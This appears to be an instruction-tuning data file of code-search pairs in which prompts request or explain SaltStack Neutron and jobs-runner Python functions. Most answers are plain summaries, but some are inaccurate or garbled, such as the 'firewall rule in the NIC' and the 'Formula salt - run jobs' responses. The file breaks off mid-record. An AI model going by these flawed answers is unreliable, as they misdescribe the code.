{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates a tenant s quota", "response": "def update_quota(tenant_id,\n                 subnet=None,\n                 router=None,\n                 network=None,\n                 floatingip=None,\n                 port=None,\n                 security_group=None,\n                 security_group_rule=None,\n                 profile=None):\n    '''\n    Update a tenant's quota\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_quota tenant-id subnet=40 router=50\n                                    network=10 floatingip=30 port=30\n\n    :param tenant_id: ID of tenant\n    :param subnet: Value of subnet quota (Optional)\n    :param router: Value of router quota (Optional)\n    :param network: Value of network quota (Optional)\n    :param floatingip: Value of floatingip quota (Optional)\n    :param port: Value of port quota (Optional)\n    :param security_group: Value of security group (Optional)\n    :param security_group_rule: Value of security group rule (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated quota\n    '''\n    conn = _auth(profile)\n    return conn.update_quota(tenant_id, subnet, router, network,\n                             floatingip, port, security_group,\n                             security_group_rule)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a new port in a network", "response": "def create_port(name,\n                network,\n                device_id=None,\n                admin_state_up=True,\n                profile=None):\n    '''\n    Creates a new port\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_port network-name port-name\n\n    :param name: Name of port to create\n    :param network: Network name or ID\n    :param device_id: ID of device (Optional)\n    :param admin_state_up: Set admin state up to true or false,\n            default: true (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created port information\n    '''\n    conn = _auth(profile)\n    return conn.create_port(name, network, device_id, admin_state_up)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating a port in a node", "response": "def update_port(port, name, admin_state_up=True, profile=None):\n    '''\n    Updates a port\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_port port-name network-name new-port-name\n\n    :param port: Port name or ID\n    :param name: Name of this port\n    :param admin_state_up: Set admin state up to true or false,\n            default: true (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated port information\n    '''\n    conn = _auth(profile)\n    return conn.update_port(port, name, admin_state_up)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a network in the network cache", "response": "def create_network(name, router_ext=None, admin_state_up=True, network_type=None, physical_network=None, segmentation_id=None, shared=None, profile=None):\n    '''\n    Creates a new network\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_network network-name\n        salt '*' neutron.create_network network-name profile=openstack1\n\n    :param name: Name of network to create\n    :param admin_state_up: should the state of the network be up?\n            default: True (Optional)\n    :param router_ext: True then if create the external network (Optional)\n    :param network_type: the Type of network that the provider is such as GRE, VXLAN, VLAN, FLAT, or LOCAL (Optional)\n    :param physical_network: the name of the physical network as neutron knows it (Optional)\n    :param segmentation_id: the vlan id or GRE id (Optional)\n    :param shared: is the network shared or not (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created network information\n    '''\n    conn = _auth(profile)\n    return conn.create_network(name, admin_state_up, router_ext, network_type, physical_network, segmentation_id, shared)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update_network(network, name, profile=None):\n    '''\n    Updates a network\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_network network-name new-network-name\n\n    :param network: ID or name of network to update\n    :param name: Name of this network\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated network information\n    '''\n    conn = _auth(profile)\n    return conn.update_network(network, name)", "response": "Updates a network in a specific profile"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create_subnet(network, cidr, name=None,\n                  ip_version=4, profile=None):\n    '''\n    Creates a new subnet\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_subnet network-name 192.168.1.0/24\n\n    :param network: Network ID or name this subnet belongs to\n    :param cidr: CIDR of subnet to create (Ex. '192.168.1.0/24')\n    :param name: Name of the subnet to create (Optional)\n    :param ip_version: Version to use, default is 4(IPv4) (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created subnet information\n    '''\n    conn = _auth(profile)\n    return conn.create_subnet(network, cidr, name, ip_version)", "response": "Creates a new subnet in the network"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating a subnet in a node", "response": "def update_subnet(subnet, name, profile=None):\n    '''\n    Updates a subnet\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_subnet subnet-name new-subnet-name\n\n    :param subnet: ID or name of subnet to update\n    :param name: Name of this subnet\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated subnet information\n    '''\n    conn = _auth(profile)\n    return conn.update_subnet(subnet, name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create_router(name, ext_network=None,\n                  admin_state_up=True, profile=None):\n    '''\n    Creates a new router\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_router new-router-name\n\n    :param name: Name of router to create (must be first)\n    :param ext_network: ID or name of the external for the gateway (Optional)\n    :param admin_state_up: Set admin state up to true or false,\n            default:true (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created router information\n    '''\n    conn = _auth(profile)\n    return conn.create_router(name, ext_network, admin_state_up)", "response": "Create a new router"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update_router(router,\n                  name=None,\n                  admin_state_up=None,\n                  profile=None,\n                  **kwargs):\n    '''\n    Updates a router\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_router router_id name=new-router-name\n                admin_state_up=True\n\n    :param router: ID or name of router to update\n    :param name: Name of this router\n    :param ext_network: ID or name of the external for the gateway (Optional)\n    :param admin_state_up: Set admin state up to true or false,\n            default: true (Optional)\n    :param profile: Profile to build on (Optional)\n    :param kwargs:\n    :return: Value of updated router information\n    '''\n    conn = _auth(profile)\n    return conn.update_router(router, name, admin_state_up, **kwargs)", "response": "Updates a router\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_router router_id name=new-router-name\n                admin_state_up=True\n\n    :param router: ID or name of router to update\n    :param name: Name of this router\n    :param ext_network: ID or name of the external for the gateway (Optional)\n    :param admin_state_up: Set admin state up to true or false,\n            default: true (Optional)\n    :param profile: Profile to build on (Optional)\n    :param kwargs:\n    :return: Value of updated router information"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_interface_router(router, subnet, profile=None):\n    '''\n    Adds an internal network interface to the specified router\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.add_interface_router router-name subnet-name\n\n    :param router: ID or name of the router\n    :param subnet: ID or name of the subnet\n    :param profile: Profile to build on (Optional)\n    :return: Added interface information\n    '''\n    conn = _auth(profile)\n    return conn.add_interface_router(router, subnet)", "response": "Adds an internal network interface to the specified router"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nremoving an internal network interface from the specified router", "response": "def remove_interface_router(router, subnet, profile=None):\n    '''\n    Removes an internal network interface from the specified router\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.remove_interface_router router-name subnet-name\n\n    :param router: ID or name of the router\n    :param subnet: ID or name of the subnet\n    :param profile: Profile to build on (Optional)\n    :return: True(Succeed) or False\n    '''\n    conn = _auth(profile)\n    return conn.remove_interface_router(router, subnet)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_gateway_router(router, ext_network, profile=None):\n    '''\n    Adds an external network gateway to the specified router\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.add_gateway_router router-name ext-network-name\n\n    :param router: ID or name of the router\n    :param ext_network: ID or name of the external network the gateway\n    :param profile: Profile to build on (Optional)\n    :return: Added Gateway router information\n    '''\n    conn = _auth(profile)\n    return conn.add_gateway_router(router, ext_network)", "response": "Adds an external network gateway to the specified router"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a new floatingIP", "response": "def create_floatingip(floating_network, port=None, profile=None):\n    '''\n    Creates a new floatingIP\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_floatingip network-name port-name\n\n    :param floating_network: Network name or ID to allocate floatingIP from\n    :param port: Of the port to be associated with the floatingIP (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created floatingIP information\n    '''\n    conn = _auth(profile)\n    return conn.create_floatingip(floating_network, port)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating a floating IP", "response": "def update_floatingip(floatingip_id, port=None, profile=None):\n    '''\n    Updates a floatingIP\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_floatingip network-name port-name\n\n    :param floatingip_id: ID of floatingIP\n    :param port: ID or name of port, to associate floatingip to `None` or do\n        not specify to disassociate the floatingip (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated floating IP information\n    '''\n    conn = _auth(profile)\n    return conn.update_floatingip(floatingip_id, port)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_security_group(name=None, description=None, profile=None):\n    '''\n    Creates a new security group\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_security_group security-group-name \\\n                description='Security group for servers'\n\n    :param name: Name of security group (Optional)\n    :param description: Description of security group (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created security group information\n    '''\n    conn = _auth(profile)\n    return conn.create_security_group(name, description)", "response": "Creates a new security group"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update_security_group(security_group, name=None, description=None,\n                          profile=None):\n    '''\n    Updates a security group\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_security_group security-group-name \\\n                new-security-group-name\n\n    :param security_group: ID or name of security group to update\n    :param name: Name of this security group (Optional)\n    :param description: Description of security group (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated security group information\n    '''\n    conn = _auth(profile)\n    return conn.update_security_group(security_group, name, description)", "response": "Updates a security group"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_security_group_rule(security_group,\n                               remote_group_id=None,\n                               direction='ingress',\n                               protocol=None,\n                               port_range_min=None,\n                               port_range_max=None,\n                               ethertype='IPv4',\n                               profile=None):\n    '''\n    Creates a new security group rule\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.show_security_group_rule security-group-rule-id\n\n    :param security_group: Security group name or ID to add rule\n    :param remote_group_id: Remote security group name or ID to\n            apply rule (Optional)\n    :param direction: Direction of traffic: ingress/egress,\n            default: ingress (Optional)\n    :param protocol: Protocol of packet: null/icmp/tcp/udp,\n            default: null (Optional)\n    :param port_range_min: Starting port range (Optional)\n    :param port_range_max: Ending port range (Optional)\n    :param ethertype: IPv4/IPv6, default: IPv4 (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created security group rule information\n    '''\n    conn = _auth(profile)\n    return conn.create_security_group_rule(security_group,\n                                           remote_group_id,\n                                           direction,\n                                           protocol,\n                                           port_range_min,\n                                           port_range_max,\n                                           ethertype)", "response": "Creates a new security group rule"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list_vpnservices(retrieve_all=True, profile=None, **kwargs):\n    '''\n    Fetches a list of all configured VPN services for a tenant\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.list_vpnservices\n\n    :param retrieve_all: True or False, default: True (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: List of VPN service\n    '''\n    conn = _auth(profile)\n    return conn.list_vpnservices(retrieve_all, **kwargs)", "response": "Fetches a list of all configured VPN services for a tenant"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching information of a VPN service", "response": "def show_vpnservice(vpnservice, profile=None, **kwargs):\n    '''\n    Fetches information of a specific VPN service\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.show_vpnservice vpnservice-name\n\n    :param vpnservice: ID or name of vpn service to look up\n    :param profile: Profile to build on (Optional)\n    :return: VPN service information\n    '''\n    conn = _auth(profile)\n    return conn.show_vpnservice(vpnservice, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a VPN service", "response": "def create_vpnservice(subnet, router, name, admin_state_up=True, profile=None):\n    '''\n    Creates a new VPN service\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_vpnservice router-name name\n\n    :param subnet: Subnet unique identifier for the VPN service deployment\n    :param router: Router unique identifier for the VPN service\n    :param name: Set a name for the VPN service\n    :param admin_state_up: Set admin state up to true or false,\n            default:True (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created VPN service information\n    '''\n    conn = _auth(profile)\n    return conn.create_vpnservice(subnet, router, name, admin_state_up)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update_vpnservice(vpnservice, desc, profile=None):\n    '''\n    Updates a VPN service\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_vpnservice vpnservice-name desc='VPN Service1'\n\n    :param vpnservice: ID or name of vpn service to update\n    :param desc: Set a description for the VPN service\n    :param profile: Profile to build on (Optional)\n    :return: Value of updated VPN service information\n    '''\n    conn = _auth(profile)\n    return conn.update_vpnservice(vpnservice, desc)", "response": "Update VPN service information"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a new IPsecSiteConnection object.", "response": "def create_ipsec_site_connection(name,\n                                 ipsecpolicy,\n                                 ikepolicy,\n                                 vpnservice,\n                                 peer_cidrs,\n                                 peer_address,\n                                 peer_id,\n                                 psk,\n                                 admin_state_up=True,\n                                 profile=None,\n                                 **kwargs):\n    '''\n    Creates a new IPsecSiteConnection\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.show_ipsec_site_connection connection-name\n                ipsec-policy-name ikepolicy-name vpnservice-name\n                192.168.XXX.XXX/24 192.168.XXX.XXX 192.168.XXX.XXX secret\n\n    :param name: Set friendly name for the connection\n    :param ipsecpolicy: IPSec policy ID or name associated with this connection\n    :param ikepolicy: IKE policy ID or name associated with this connection\n    :param vpnservice: VPN service instance ID or name associated with\n            this connection\n    :param peer_cidrs: Remote subnet(s) in CIDR format\n    :param peer_address: Peer gateway public IPv4/IPv6 address or FQDN\n    :param peer_id: Peer router identity for authentication\n            Can be IPv4/IPv6 address, e-mail address, key id, or FQDN\n    :param psk: Pre-shared key string\n    :param initiator: Initiator state in lowercase, default:bi-directional\n    :param admin_state_up: Set admin state up to true or false,\n            default: True (Optional)\n    :param mtu: size for the connection, default:1500 (Optional)\n    :param dpd_action: Dead Peer Detection attribute: hold/clear/disabled/\n            restart/restart-by-peer (Optional)\n    :param dpd_interval: Dead Peer Detection attribute (Optional)\n    :param dpd_timeout: Dead Peer Detection attribute (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created IPSec site connection information\n    '''\n    conn = _auth(profile)\n    return conn.create_ipsec_site_connection(name,\n                                             ipsecpolicy,\n                                             ikepolicy,\n                                             vpnservice,\n                                             peer_cidrs,\n                                             peer_address,\n                                             peer_id,\n                                             psk,\n                                             admin_state_up,\n                                             **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new IKE policy", "response": "def create_ikepolicy(name, profile=None, **kwargs):\n    '''\n    Creates a new IKEPolicy\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_ikepolicy ikepolicy-name\n                phase1_negotiation_mode=main auth_algorithm=sha1\n                encryption_algorithm=aes-128 pfs=group5\n\n    :param name: Name of the IKE policy\n    :param phase1_negotiation_mode: IKE Phase1 negotiation mode in lowercase,\n            default: main (Optional)\n    :param auth_algorithm: Authentication algorithm in lowercase,\n            default: sha1 (Optional)\n    :param encryption_algorithm: Encryption algorithm in lowercase.\n            default:aes-128 (Optional)\n    :param pfs: Prefect Forward Security in lowercase,\n            default: group5 (Optional)\n    :param units: IKE lifetime attribute. default: seconds (Optional)\n    :param value: IKE lifetime attribute. default: 3600 (Optional)\n    :param ike_version: IKE version in lowercase, default: v1 (Optional)\n    :param profile: Profile to build on (Optional)\n    :param kwargs:\n    :return: Created IKE policy information\n    '''\n    conn = _auth(profile)\n    return conn.create_ikepolicy(name, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new IPSec policy", "response": "def create_ipsecpolicy(name, profile=None, **kwargs):\n    '''\n    Creates a new IPsecPolicy\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_ipsecpolicy ipsecpolicy-name\n                transform_protocol=esp auth_algorithm=sha1\n                encapsulation_mode=tunnel encryption_algorithm=aes-128\n\n    :param name: Name of the IPSec policy\n    :param transform_protocol: Transform protocol in lowercase,\n            default: esp (Optional)\n    :param auth_algorithm: Authentication algorithm in lowercase,\n            default: sha1 (Optional)\n    :param encapsulation_mode: Encapsulation mode in lowercase,\n            default: tunnel (Optional)\n    :param encryption_algorithm: Encryption algorithm in lowercase,\n            default:aes-128 (Optional)\n    :param pfs: Prefect Forward Security in lowercase,\n            default: group5 (Optional)\n    :param units: IPSec lifetime attribute. default: seconds (Optional)\n    :param value: IPSec lifetime attribute. default: 3600 (Optional)\n    :param profile: Profile to build on (Optional)\n    :return: Created IPSec policy information\n    '''\n    conn = _auth(profile)\n    return conn.create_ipsecpolicy(name, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_firewall_rule(protocol, action, profile=None, **kwargs):\n    '''\n    Creates a new firewall rule\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.create_firewall_rule protocol action\n                tenant_id=TENANT_ID name=NAME description=DESCRIPTION ip_version=IP_VERSION\n                source_ip_address=SOURCE_IP_ADDRESS destination_ip_address=DESTINATION_IP_ADDRESS source_port=SOURCE_PORT\n                destination_port=DESTINATION_PORT shared=SHARED enabled=ENABLED\n\n    :param protocol: Protocol for the firewall rule, choose \"tcp\",\"udp\",\"icmp\" or \"None\".\n    :param action: Action for the firewall rule, choose \"allow\" or \"deny\".\n    :param tenant_id: The owner tenant ID. (Optional)\n    :param name: Name for the firewall rule. (Optional)\n    :param description: Description for the firewall rule. (Optional)\n    :param ip_version: IP protocol version, default: 4. (Optional)\n    :param source_ip_address: Source IP address or subnet. (Optional)\n    :param destination_ip_address: Destination IP address or subnet. (Optional)\n    :param source_port: Source port (integer in [1, 65535] or range in a:b). (Optional)\n    :param destination_port: Destination port (integer in [1, 65535] or range in a:b). (Optional)\n    :param shared: Set shared to True, default: False. (Optional)\n    :param enabled: To enable this rule, default: True. (Optional)\n    '''\n    conn = _auth(profile)\n    return conn.create_firewall_rule(protocol, action, **kwargs)", "response": "Creates a firewall rule in the NIC."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update_firewall_rule(firewall_rule,\n                         protocol=None,\n                         action=None,\n                         name=None,\n                         description=None,\n                         ip_version=None,\n                         source_ip_address=None,\n                         destination_ip_address=None,\n                         source_port=None,\n                         destination_port=None,\n                         shared=None,\n                         enabled=None,\n                         profile=None):\n    '''\n    Update a firewall rule\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' neutron.update_firewall_rule firewall_rule protocol=PROTOCOL action=ACTION\n                name=NAME description=DESCRIPTION ip_version=IP_VERSION\n                source_ip_address=SOURCE_IP_ADDRESS destination_ip_address=DESTINATION_IP_ADDRESS\n                source_port=SOURCE_PORT destination_port=DESTINATION_PORT shared=SHARED enabled=ENABLED\n\n    :param firewall_rule: ID or name of firewall rule to update.\n    :param protocol: Protocol for the firewall rule, choose \"tcp\",\"udp\",\"icmp\" or \"None\". (Optional)\n    :param action: Action for the firewall rule, choose \"allow\" or \"deny\". (Optional)\n    :param name: Name for the firewall rule. (Optional)\n    :param description: Description for the firewall rule. (Optional)\n    :param ip_version: IP protocol version, default: 4. (Optional)\n    :param source_ip_address: Source IP address or subnet. (Optional)\n    :param destination_ip_address: Destination IP address or subnet. (Optional)\n    :param source_port: Source port (integer in [1, 65535] or range in a:b). (Optional)\n    :param destination_port: Destination port (integer in [1, 65535] or range in a:b). (Optional)\n    :param shared: Set shared to True, default: False. (Optional)\n    :param enabled: To enable this rule, default: True. (Optional)\n    :param profile: Profile to build on (Optional)\n    '''\n    conn = _auth(profile)\n    return conn.update_firewall_rule(firewall_rule, protocol, action, name, description, ip_version,\n                                     source_ip_address, destination_ip_address, source_port, destination_port,\n                                     shared, enabled)", "response": "Update a firewall rule."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef active(display_progress=False):\n    '''\n    Return a report on all actively running jobs from a job id centric\n    perspective\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.active\n    '''\n    ret = {}\n    client = salt.client.get_local_client(__opts__['conf_file'])\n    try:\n        active_ = client.cmd('*', 'saltutil.running', timeout=__opts__['timeout'])\n    except SaltClientError as client_error:\n        print(client_error)\n        return ret\n\n    if display_progress:\n        __jid_event__.fire_event({\n            'message': 'Attempting to contact minions: {0}'.format(list(active_.keys()))\n            }, 'progress')\n    for minion, data in six.iteritems(active_):\n        if display_progress:\n            __jid_event__.fire_event({'message': 'Received reply from minion {0}'.format(minion)}, 'progress')\n        if not isinstance(data, list):\n            continue\n        for job in data:\n            if not job['jid'] in ret:\n                ret[job['jid']] = _format_jid_instance(job['jid'], job)\n                ret[job['jid']].update({'Running': [{minion: job.get('pid', None)}], 'Returned': []})\n            else:\n                ret[job['jid']]['Running'].append({minion: job['pid']})\n\n    mminion = salt.minion.MasterMinion(__opts__)\n    for jid in ret:\n        returner = _get_returner((__opts__['ext_job_cache'], __opts__['master_job_cache']))\n        data = mminion.returners['{0}.get_jid'.format(returner)](jid)\n        if data:\n            for minion in data:\n                if minion not in ret[jid]['Returned']:\n                    ret[jid]['Returned'].append(minion)\n\n    return ret", "response": "Return a list of all actively running jobs from a job id centric\n    perspective\n    CLI Example : bash\nFormula salt - run jobs. active\n   "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef lookup_jid(jid,\n               ext_source=None,\n               returned=True,\n               missing=False,\n               display_progress=False):\n    '''\n    Return the printout from a previously executed job\n\n    jid\n        The jid to look up.\n\n    ext_source\n        The external job cache to use. Default: `None`.\n\n    returned : True\n        If ``True``, include the minions that did return from the command.\n\n        .. versionadded:: 2015.8.0\n\n    missing : False\n        If ``True``, include the minions that did *not* return from the\n        command.\n\n    display_progress : False\n        If ``True``, fire progress events.\n\n        .. versionadded:: 2015.5.0\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.lookup_jid 20130916125524463507\n        salt-run jobs.lookup_jid 20130916125524463507 --out=highstate\n    '''\n    ret = {}\n    mminion = salt.minion.MasterMinion(__opts__)\n    returner = _get_returner((\n        __opts__['ext_job_cache'],\n        ext_source,\n        __opts__['master_job_cache']\n    ))\n\n    try:\n        data = list_job(\n            jid,\n            ext_source=ext_source,\n            display_progress=display_progress\n        )\n    except TypeError:\n        return ('Requested returner could not be loaded. '\n                'No JIDs could be retrieved.')\n\n    targeted_minions = data.get('Minions', [])\n    returns = data.get('Result', {})\n\n    if returns:\n        for minion in returns:\n            if display_progress:\n                __jid_event__.fire_event({'message': minion}, 'progress')\n            if u'return' in returns[minion]:\n                if returned:\n                    ret[minion] = returns[minion].get(u'return')\n            else:\n                if returned:\n                    ret[minion] = returns[minion].get('return')\n    if missing:\n        for minion_id in (x for x in targeted_minions if x not in returns):\n            ret[minion_id] = 'Minion did not return'\n\n    # We need to check to see if the 'out' key is present and use it to specify\n    # the correct outputter, so we get highstate output for highstate runs.\n    try:\n        # Check if the return data has an 'out' key. We'll use that as the\n        # outputter in the absence of one being passed on the CLI.\n        outputter = None\n        _ret = returns[next(iter(returns))]\n        if 'out' in _ret:\n            outputter = _ret['out']\n        elif 'outputter' in _ret.get('return', {}).get('return', {}):\n            outputter = _ret['return']['return']['outputter']\n    except (StopIteration, AttributeError):\n        pass\n\n    if outputter:\n        return {'outputter': outputter, 'data': ret}\n    else:\n        return ret", "response": "Return the printout from a previously executed job."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list_job(jid, ext_source=None, display_progress=False):\n    '''\n    List a specific job given by its jid\n\n    ext_source\n        If provided, specifies which external job cache to use.\n\n    display_progress : False\n        If ``True``, fire progress events.\n\n        .. versionadded:: 2015.8.8\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.list_job 20130916125524463507\n        salt-run jobs.list_job 20130916125524463507 --out=pprint\n    '''\n    ret = {'jid': jid}\n    mminion = salt.minion.MasterMinion(__opts__)\n    returner = _get_returner((\n        __opts__['ext_job_cache'],\n        ext_source,\n        __opts__['master_job_cache']\n    ))\n    if display_progress:\n        __jid_event__.fire_event(\n            {'message': 'Querying returner: {0}'.format(returner)},\n            'progress'\n        )\n\n    job = mminion.returners['{0}.get_load'.format(returner)](jid)\n    ret.update(_format_jid_instance(jid, job))\n    ret['Result'] = mminion.returners['{0}.get_jid'.format(returner)](jid)\n\n    fstr = '{0}.get_endtime'.format(__opts__['master_job_cache'])\n    if (__opts__.get('job_cache_store_endtime')\n            and fstr in mminion.returners):\n        endtime = mminion.returners[fstr](jid)\n        if endtime:\n            ret['EndTime'] = endtime\n\n    return ret", "response": "Return a specific job given by its jid"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_jobs(ext_source=None,\n              outputter=None,\n              search_metadata=None,\n              search_function=None,\n              search_target=None,\n              start_time=None,\n              end_time=None,\n              display_progress=False):\n    '''\n    List all detectable jobs and associated functions\n\n    ext_source\n        If provided, specifies which external job cache to use.\n\n    **FILTER OPTIONS**\n\n    .. note::\n        If more than one of the below options are used, only jobs which match\n        *all* of the filters will be returned.\n\n    search_metadata\n        Specify a dictionary to match to the job's metadata. If any of the\n        key-value pairs in this dictionary match, the job will be returned.\n        Example:\n\n        .. code-block:: bash\n\n            salt-run jobs.list_jobs search_metadata='{\"foo\": \"bar\", \"baz\": \"qux\"}'\n\n    search_function\n        Can be passed as a string or a list. Returns jobs which match the\n        specified function. Globbing is allowed. Example:\n\n        .. code-block:: bash\n\n            salt-run jobs.list_jobs search_function='test.*'\n            salt-run jobs.list_jobs search_function='[\"test.*\", \"pkg.install\"]'\n\n        .. versionchanged:: 2015.8.8\n            Multiple targets can now also be passed as a comma-separated list.\n            For example:\n\n            .. code-block:: bash\n\n                salt-run jobs.list_jobs search_function='test.*,pkg.install'\n\n    search_target\n        Can be passed as a string or a list. Returns jobs which match the\n        specified minion name. Globbing is allowed. Example:\n\n        .. code-block:: bash\n\n            salt-run jobs.list_jobs search_target='*.mydomain.tld'\n            salt-run jobs.list_jobs search_target='[\"db*\", \"myminion\"]'\n\n        .. versionchanged:: 2015.8.8\n            Multiple targets can now also be passed as a comma-separated list.\n            For example:\n\n            .. code-block:: bash\n\n                salt-run jobs.list_jobs search_target='db*,myminion'\n\n    start_time\n        Accepts any timestamp supported by the dateutil_ Python module (if this\n        module is not installed, this argument will be ignored). Returns jobs\n        which started after this timestamp.\n\n    end_time\n        Accepts any timestamp supported by the dateutil_ Python module (if this\n        module is not installed, this argument will be ignored). Returns jobs\n        which started before this timestamp.\n\n    .. _dateutil: https://pypi.python.org/pypi/python-dateutil\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run jobs.list_jobs\n        salt-run jobs.list_jobs search_function='test.*' search_target='localhost' search_metadata='{\"bar\": \"foo\"}'\n        salt-run jobs.list_jobs start_time='2015, Mar 16 19:00' end_time='2015, Mar 18 22:00'\n\n    '''\n    returner = _get_returner((\n        __opts__['ext_job_cache'],\n        ext_source,\n        __opts__['master_job_cache']\n    ))\n    if display_progress:\n        __jid_event__.fire_event(\n            {'message': 'Querying returner {0} for jobs.'.format(returner)},\n            'progress'\n        )\n    mminion = salt.minion.MasterMinion(__opts__)\n\n    ret = mminion.returners['{0}.get_jids'.format(returner)]()\n\n    mret = {}\n    for item in ret:\n        _match = True\n        if search_metadata:\n            _match = False\n            if 'Metadata' in ret[item]:\n                if isinstance(search_metadata, dict):\n                    for key in search_metadata:\n                        if key in ret[item]['Metadata']:\n                            if ret[item]['Metadata'][key] == search_metadata[key]:\n                                _match = True\n                else:\n                    log.info('The search_metadata parameter must be specified'\n                             ' as a dictionary.  Ignoring.')\n        if search_target and _match:\n            _match = False\n            if 'Target' in ret[item]:\n                targets = ret[item]['Target']\n                if isinstance(targets, six.string_types):\n                    targets = [targets]\n                for target in targets:\n                    for key in salt.utils.args.split_input(search_target):\n                        if fnmatch.fnmatch(target, key):\n                            _match = True\n\n        if search_function and _match:\n            _match = False\n            if 'Function' in ret[item]:\n                for key in salt.utils.args.split_input(search_function):\n                    if fnmatch.fnmatch(ret[item]['Function'], key):\n                        _match = True\n\n        if start_time and _match:\n            _match = False\n            if DATEUTIL_SUPPORT:\n                parsed_start_time = dateutil_parser.parse(start_time)\n                _start_time = dateutil_parser.parse(ret[item]['StartTime'])\n                if _start_time >= parsed_start_time:\n                    _match = True\n            else:\n                log.error(\n                    '\\'dateutil\\' library not available, skipping start_time '\n                    'comparison.'\n                )\n\n        if end_time and _match:\n            _match = False\n            if DATEUTIL_SUPPORT:\n                parsed_end_time = dateutil_parser.parse(end_time)\n                _start_time = dateutil_parser.parse(ret[item]['StartTime'])\n                if _start_time <= parsed_end_time:\n                    _match = True\n            else:\n                